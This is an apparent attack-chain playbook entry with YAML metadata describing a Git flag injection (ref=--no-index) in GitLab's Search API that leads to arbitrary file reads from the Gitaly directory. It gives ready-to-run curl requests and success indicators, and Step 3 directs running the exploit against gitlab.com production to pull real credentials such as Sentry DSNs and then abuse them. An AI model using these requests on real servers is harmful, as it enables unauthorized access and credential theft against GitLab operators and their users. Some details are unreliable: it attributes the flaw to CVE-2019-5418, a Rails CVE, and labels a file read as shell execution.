---
tags:
  - gitlab
  - command-injection
  - file-read
  - gitaly
  - api-vulnerability
  - git-flag-injection
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Git-Flag-in-GitLab-Search-API]]'
  - '[[procedures/Observe-Leaked-File-Contents]]'
  - '[[procedures/Extract-Sensitive-Tokens-from-Production]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:32:48.447Z'
description: >-
  A multi-stage attack exploiting Git flag injection in GitLab's Search API to
  read arbitrary files from the Gitaly directory, including sensitive
  configuration data like API keys and tokens.
skill_level: intermediate
impact_level: high
id: 2d5ab9dc-c4c3-4150-a142-14da651346c1
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Data from Local System]]'
---
# GitLab Search API Git Flag Injection for Arbitrary File Read

Multi-stage attack chain demonstrating exploitation of Git flag injection in GitLab's Search API with 'blobs' scope to achieve arbitrary file reads from the server's Gitaly directory, potentially exposing sensitive credentials like API keys, tokens, and Sentry DSNs.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[API Request Injection] --> B[Command Execution] --> C[File Exfiltration]
    A -->|Inject --no-index flag| B
    B -->|git grep on current dir| C
    C -->|Leak config.toml| D[Credential Abuse]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- GitLab instance (version vulnerable to CVE-2019-5418 or similar, e.g., pre-12.3)
- Access to /api/v4/projects/{id}/search endpoint
- Network access to GitLab API (port 80/443)

### Initial Access Requirements

- Valid project ID (authenticated or public project)
- Optional: Private token for authenticated access
- No prior privilege escalation needed; exploits public-facing API

## Detailed Attack Procedures

### Step 1: Inject Git Flag in Search API
procedure: [[procedures/Inject-Git-Flag-in-GitLab-Search-API]]

**Objective**: Send a manipulated API request to inject the --no-index flag into the git grep command, forcing it to search the current working directory instead of the repository.

**Instructions**: Use [[commands/curl-gitlab-search-injection-local]] to target a local or test GitLab instance with authentication:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

This request uses the /api/v4/projects/{id}/search endpoint with scope=blobs, a broad search pattern (.), and ref=--no-index to trigger the injection.

**Expected Output**: JSON response with leaked file contents, such as escaped data from VERSION and config.toml files.

**Success Indicators**:
- Response contains non-repository file data (e.g., "Gitaly, version 1.53.2")
- No 404 or auth errors; API processes the request

### Step 2: Observe Leaked File Contents
procedure: [[procedures/Observe-Leaked-File-Contents]]

**Objective**: Analyze the API response to confirm arbitrary file read and identify sensitive data exposure.

**Instructions**: Review the JSON output from the previous step for base64-encoded or escaped file snippets. No additional command needed; parse the response manually or with jq:

```bash
echo '{"data":"VERSION\\u00001\\u0000Gitaly, version 1.53.2\\n"}' | jq '.data'
```

Look for indicators of files outside the repo, like /var/opt/gitlab/gitaly contents.

**Expected Output**: Escaped strings revealing file paths and contents, e.g., config.toml snippets with configuration comments.

**Success Indicators**:
- Presence of server filesystem files (e.g., config.toml, VERSION)
- Sensitive keywords like "sentry_dsn" or tokens in output

### Step 3: Extract Sensitive Tokens from Production
procedure: [[procedures/Extract-Sensitive-Tokens-from-Production]]

**Objective**: Reproduce the exploit on a production GitLab instance to extract real credentials from config.toml.

**Instructions**: Execute [[commands/curl-gitlab-search-injection-production]] against gitlab.com or similar, using a public project ID:

```bash
curl 'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index'
```

Use search=a to match common characters in config files.

**Expected Output**: JSON with leaked data like 'sentry_dsn = "https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16"'.

**Success Indicators**:
- Response includes actual tokens or DSNs
- Ability to abuse extracted credentials (e.g., test Sentry access)

## Attack Chain Summary

### Key Achievements

1. Successful injection of Git flags via unsanitized 'ref' parameter
2. Arbitrary read of Gitaly directory files, exposing config.toml
3. Extraction of production credentials enabling further compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Unix Shell]] Unix Shell
- [[Data from Local System]] Data from Local System

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
